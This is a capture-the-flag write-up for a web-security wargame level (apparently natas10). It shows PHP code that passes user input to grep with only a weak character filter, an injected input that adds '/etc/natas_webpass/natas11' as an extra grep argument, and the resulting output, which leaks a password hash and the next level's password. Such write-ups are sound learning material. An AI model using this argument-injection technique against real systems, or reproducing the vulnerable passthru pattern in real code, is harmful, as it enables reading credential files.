This is the same as natas9 except the characters `;`, `|` and `&` are filtered:
```php
<?   

$key = "";   

if(array_key_exists("needle", $_REQUEST)) {    
	$key = $_REQUEST["needle"];   
}      

if($key != "") {       
	if(preg_match('/[;|&]/',$key)) {           
		print "Input contains an illegal character!";       
	} else {        
		passthru("grep -i $key dictionary.txt");       
	}   
}

?>
```

So the concept is going to be the same as the last level, but we need to come up with a more creative way of injecting our commands

I tried inserting a wildcard character (`.*`) into this as `grep` does support wildcard characters and I got this output:
```
.htaccess:AuthType Basic
.htaccess: AuthName "Authentication required"
.htaccess: AuthUserFile /var/www/natas/natas10/.htpasswd
.htaccess: require valid-user
.htpasswd:natas10:$apr1$t6bjsq8a$xpGFjsUmCvTZohx70DGXg/
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:Allah
dictionary.txt:Allah's
dictionary.txt:American
dictionary.txt:Americanism
dictionary.txt:Americanism's
dictionary.txt:Americanisms
dictionary.txt:Americans
...
```

The wildcard character is working. `grep` is grepping all the files with `.` in its name.

So I tried inserting the password file path into the input field so that `grep` can read it: `.* /etc/natas_webpass/natas11`. And this is the output:
```
.htaccess:AuthType Basic
.htaccess: AuthName "Authentication required"
.htaccess: AuthUserFile /var/www/natas/natas10/.htpasswd
.htaccess: require valid-user
.htpasswd:natas10:$apr1$t6bjsq8a$xpGFjsUmCvTZohx70DGXg/
/etc/natas_webpass/natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:Allah
dictionary.txt:Allah's
dictionary.txt:American
dictionary.txt:Americanism
...
```